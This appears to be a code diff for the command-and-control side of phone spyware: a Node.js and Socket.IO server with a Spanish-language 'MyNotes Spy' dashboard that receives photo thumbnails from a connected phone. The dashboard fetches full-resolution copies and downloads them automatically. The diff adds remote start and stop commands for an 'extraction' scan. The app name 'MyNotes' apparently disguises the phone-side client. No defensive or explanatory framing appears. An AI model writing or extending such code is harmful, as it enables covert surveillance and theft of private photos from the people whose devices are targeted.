@@ -10,66 +10,56 @@ app.get('/', (req, res) => {
     res.send(`
     <html>
         <head>
-            <title>MyNotes - Centro de Control</title>
+            <title>MyNotes - Centro de Comando</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; }
+                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; padding: 20px; }
                 
-                /* HEADER FIJO */
-                .header { 
-                    position: sticky; top: 0; background: rgba(18, 18, 18, 0.95); z-index: 100; 
-                    padding: 15px; border-bottom: 2px solid #333; margin-bottom: 15px;
-                    display: flex; flex-direction: column; gap: 10px;
-                    box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+                .dashboard {
+                    position: sticky; top: 0; z-index: 100;
+                    background: #1e1e1e; padding: 15px; border-radius: 10px;
+                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+                    margin-bottom: 20px;
                 }
 
-                .controls { display: flex; justify-content: space-between; align-items: center; }
+                .status-bar { display: flex; justify-content: space-between; margin-bottom: 15px; font-weight: bold; }
+                .status-connected { color: #00e676; }
+                .status-disconnected { color: #ff1744; }
 
-                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
+                /* BOTONES DE CONTROL */
+                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
                 
-                .card { 
-                    background: #1e1e1e; border-radius: 8px; overflow: hidden; 
-                    text-align: center; border: 1px solid #333; position: relative;
-                    animation: fadeIn 0.5s;
-                }
-                @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-                .card img { width: 100%; height: 110px; object-fit: cover; opacity: 0.7; }
-                .card.hd img { opacity: 1; border-bottom: 3px solid #00e676; height: 130px; }
+                .btn-ctrl { padding: 15px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: white; font-size: 16px; transition: 0.2s; }
                 
-                .info { padding: 5px; font-size: 10px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-
-                /* BOTONES */
-                .btn-req { 
-                    background: #6200ea; border: none; padding: 10px; width: 100%; 
-                    cursor: pointer; color: white; font-weight: bold; font-size: 11px;
-                }
-                .btn-req:hover { background: #7c43bd; }
-                .btn-req:disabled { background: #333; cursor: wait; color: #777; }
-
-                /* BOTÓN DE PAUSA */
-                #btnPause {
-                    padding: 10px 25px; font-size: 14px; font-weight: bold; border: none; border-radius: 5px;
-                    cursor: pointer; background: #ff1744; color: white; width: 100%;
-                    transition: background 0.3s;
-                }
+                #btnStart { background: #2979ff; } /* Azul */
+                #btnStart:active { background: #1565c0; }
                 
-                #status { font-weight: bold; font-size: 14px; }
+                #btnStop { background: #d50000; } /* Rojo */
+                #btnStop:active { background: #b71c1c; }
+
+                #btnPause { background: #ff9100; grid-column: span 2; margin-top: 5px;} /* Naranja */
+
+                /* Grid de fotos */
+                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; }
+                .card img { width: 100%; height: 100px; object-fit: cover; }
+                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
+                .btn-req { width: 100%; padding: 8px; border: none; background: #6200ea; color: white; font-weight: bold; cursor: pointer; }
+                
             </style>
         </head>
         <body>
-            <div class="header">
-                <div class="controls">
-                    <div>
-                        <span style="font-size: 20px;">📡 MyNotes Spy</span>
-                        <div id="status" style="color: #666; font-size: 12px; margin-top: 5px;">Esperando...</div>
-                    </div>
-                    <div style="text-align: right;">
-                        <span id="totalCounter" style="color: #00e676; font-size: 18px; font-weight: bold;">0</span>
-                        <div style="font-size: 10px; color: #aaa;">FOTOS TOTALES</div>
-                    </div>
+            <div class="dashboard">
+                <div class="status-bar">
+                    <span>📡 ESTADO: <span id="status" class="status-disconnected">Esperando...</span></span>
+                    <span id="counter">0 fotos</span>
                 </div>
-                <button id="btnPause" onclick="togglePause()">⏸ CONGELAR PANTALLA</button>
+                
+                <div class="controls">
+                    <button id="btnStart" class="btn-ctrl" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
+                    <button id="btnStop" class="btn-ctrl" onclick="sendCommand('stop')">⏹ DETENER</button>
+                    <button id="btnPause" class="btn-ctrl" onclick="togglePauseUI()">👀 PAUSAR VISUALIZACIÓN</button>
+                </div>
             </div>
 
             <div class="grid" id="grid"></div>
@@ -78,95 +68,85 @@ app.get('/', (req, res) => {
             <script>
                 const socket = io();
                 const grid = document.getElementById('grid');
-                const status = document.getElementById('status');
-                const totalCounter = document.getElementById('totalCounter');
+                const statusEl = document.getElementById('status');
+                const counterEl = document.getElementById('counter');
                 const btnPause = document.getElementById('btnPause');
 
-                let isPaused = false;
-                let pendingBuffer = []; // Aquí guardaremos los DATOS, no el HTML
-                let count = 0;
+                let photoCount = 0;
+                let isUiPaused = false;
+                let buffer = [];
 
-                function togglePause() {
-                    isPaused = !isPaused;
-                    
-                    if (isPaused) {
-                        btnPause.style.background = "#ff9100"; // Naranja
-                        btnPause.innerText = "⏸ PAUSADO (Esperando...)";
-                    } else {
-                        // AL REANUDAR
-                        btnPause.style.background = "#ff1744"; // Rojo normal
-                        btnPause.innerText = "⏸ CONGELAR PANTALLA";
-                        
-                        // Procesar todo lo acumulado
-                        if (pendingBuffer.length > 0) {
-                            status.innerText = "⚡ Procesando " + pendingBuffer.length + " fotos acumuladas...";
-                            
-                            // Inyectamos todo lo pendiente
-                            pendingBuffer.forEach(data => createCard(data));
-                            
-                            // Limpiamos el buffer
-                            pendingBuffer = [];
-                        }
+                // --- COMANDOS AL CELULAR ---
+                function sendCommand(type) {
+                    if(type === 'start') {
+                        socket.emit('admin_command', { action: 'start_scan' });
+                        alert("Orden enviada: Iniciando extracción...");
+                    } else if (type === 'stop') {
+                        socket.emit('admin_command', { action: 'stop_scan' });
                     }
                 }
 
-                // Función dedicada a crear la tarjeta
-                function createCard(data) {
-                    if(document.getElementById(data.path)) return; // Evitar duplicados
-
-                    count++;
-                    totalCounter.innerText = count;
-
-                    const card = document.createElement('div');
-                    card.className = 'card';
-                    card.id = data.path;
-                    card.innerHTML = \`
-                        <img src="data:image/jpeg;base64,\${data.image64}">
-                        <div class="info">\${data.name}</div>
-                        <button class="btn-req" onclick="pedirYDescargar(this, '\${data.path}')">⚡ OBTENER HD</button>
-                    \`;
-                    grid.prepend(card);
+                // --- CONTROL DE UI (PAUSA VISUAL) ---
+                function togglePauseUI() {
+                    isUiPaused = !isUiPaused;
+                    btnPause.innerText = isUiPaused ? "▶ REANUDAR VISUALIZACIÓN" : "👀 PAUSAR VISUALIZACIÓN";
+                    if(!isUiPaused && buffer.length > 0) {
+                        buffer.forEach(d => renderCard(d));
+                        buffer = [];
+                    }
                 }
 
+                // --- SOCKETS ---
                 socket.on('connection_alert', msg => {
-                    status.innerText = msg;
-                    status.style.color = msg.includes("Conectado") ? "#00e676" : "#ff1744";
+                    statusEl.innerText = msg;
+                    statusEl.className = msg.includes("Conectado") ? "status-connected" : "status-disconnected";
                 });
 
-                // 1. LLEGA MINIATURA
                 socket.on('new_preview', data => {
-                    if (isPaused) {
-                        // Si está pausado, SOLO guardamos en el array y actualizamos el botón
-                        pendingBuffer.push(data);
-                        btnPause.innerText = "▶ REANUDAR (" + pendingBuffer.length + " pendientes)";
+                    if(isUiPaused) {
+                        buffer.push(data);
                     } else {
-                        // Si no está pausado, creamos la tarjeta inmediatamente
-                        createCard(data);
+                        renderCard(data);
                     }
                 });
 
-                // 2. LLEGA HD (Esta siempre pasa, aunque esté pausado, para que se descargue)
                 socket.on('receive_full', data => {
                     downloadBase64File(data.image64, data.name);
-                    
-                    const originalName = data.name.replace("HD_", "");
-                    const cards = document.getElementsByClassName('card');
-                    
-                    for(let card of cards) {
-                        if(card.innerHTML.includes(originalName)) {
-                            card.classList.add('hd');
-                            card.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
-                            const btn = card.querySelector('button');
-                            btn.innerText = "✅ LISTO";
-                            btn.style.background = "#00c853";
-                            btn.style.color = "white";
-                        }
-                    }
+                    updateCardToHD(data);
                 });
 
-                function pedirYDescargar(btn, path) {
-                    btn.innerText = "⏳ ...";
-                    btn.disabled = true;
+                // --- RENDERING ---
+                function renderCard(data) {
+                    if(document.getElementById(data.path)) return;
+                    photoCount++;
+                    counterEl.innerText = photoCount + " fotos";
+
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.id = data.path;
+                    div.innerHTML = \`
+                        <img src="data:image/jpeg;base64,\${data.image64}">
+                        <button class="btn-req" onclick="pedirHD(this, '\${data.path}')">⚡ HD</button>
+                    \`;
+                    grid.prepend(div);
+                }
+
+                function updateCardToHD(data) {
+                    const name = data.name.replace("HD_", "");
+                    // Búsqueda simple por contenido HTML (el path está en el onclick)
+                    const cards = document.getElementsByClassName('card');
+                    for(let c of cards) {
+                        if(c.innerHTML.includes(name) || c.id === data.path) { // Intento de match
+                            c.classList.add('hd');
+                            c.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
+                            c.querySelector('button').innerText = "✅";
+                            c.querySelector('button').style.background = "#00c853";
+                        }
+                    }
+                }
+
+                function pedirHD(btn, path) {
+                    btn.innerText = "...";
                     socket.emit('order_download', { path: path });
                 }
 
@@ -188,14 +168,24 @@ const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });
 
 io.on('connection', (socket) => {
-    io.emit('connection_alert', '✅ Dispositivo Conectado');
+    io.emit('connection_alert', '✅ Celular Conectado');
 
+    // REENVÍO DE DATOS
     socket.on('usrData', (data) => {
         if (data.dataType === 'preview_image') io.emit('new_preview', data);
         else if (data.dataType === 'full_image') io.emit('receive_full', data);
     });
 
+    // COMANDOS DE ADMIN (WEB -> CELULAR)
+    socket.on('admin_command', (cmd) => {
+        console.log("Comando Admin:", cmd.action);
+        // 'command_start_scan' o 'command_stop_scan'
+        socket.broadcast.emit('command_' + cmd.action); 
+    });
+
+    // PEDIDO DE DESCARGA
     socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));
+
     socket.on('disconnect', () => io.emit('connection_alert', '❌ Desconectado'));
 });
 
